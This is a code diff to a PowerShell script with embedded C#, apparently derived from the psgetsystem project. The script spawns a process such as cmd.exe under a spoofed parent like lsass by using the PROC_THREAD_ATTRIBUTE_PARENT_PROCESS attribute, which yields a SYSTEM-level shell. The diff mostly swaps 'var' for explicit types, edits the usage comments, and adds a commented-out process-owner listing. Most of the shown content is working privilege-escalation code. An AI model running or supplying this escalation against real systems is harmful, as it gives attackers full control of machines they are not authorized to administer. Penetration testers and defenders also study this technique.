@@ -1,8 +1,15 @@
+<#
+
+$owners = @{}
+gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
+#>
+
 #Simple powershell/C# to spawn a process under a different parent process
 #Launch PowerShell As Administrator
-#usage: . .\GetSystem.ps1;  [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
-#usage: . .\GetSystem.ps1;  [MyProcess]::CreateProcessFromParent((Get-Process fontdrvhost)[0].Id,"cmd.exe")
-# Note -> Tests All 3 cases described by MITRE - Impersonation/Theft, Create Process, Make & Impersonate
+#usage: . .\Get- System.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+#Reference: https://github.com/decoder-it/psgetsystem
 
 
 
@@ -94,19 +101,19 @@ public class MyProcess
 		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
 
 
-        var pi = new PROCESS_INFORMATION();
-        var si = new STARTUPINFOEX();
+        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+        STARTUPINFOEX si = new STARTUPINFOEX();
         si.StartupInfo.cb = Marshal.SizeOf(si);
         IntPtr lpValue = IntPtr.Zero;
 
         try
         {
 
-            var lpSize = IntPtr.Zero;
+            IntPtr lpSize = IntPtr.Zero;
             InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
             si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
             InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
-            var phandle = Process.GetProcessById(ppid).Handle;
+            IntPtr phandle = Process.GetProcessById(ppid).Handle;
             lpValue = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(lpValue, phandle);
 
@@ -120,12 +127,12 @@ public class MyProcess
                 IntPtr.Zero);
 
 
-            var pattr = new SECURITY_ATTRIBUTES();
-            var tattr = new SECURITY_ATTRIBUTES();
+            SECURITY_ATTRIBUTES pattr = new SECURITY_ATTRIBUTES();
+            SECURITY_ATTRIBUTES tattr = new SECURITY_ATTRIBUTES();
             pattr.nLength = Marshal.SizeOf(pattr);
             tattr.nLength = Marshal.SizeOf(tattr);
             Console.Write("Starting: " + command  + "...");
-			var b= CreateProcess(command, null, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
+			bool b = CreateProcess(command, null, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
 			Console.WriteLine(b);
 
         }
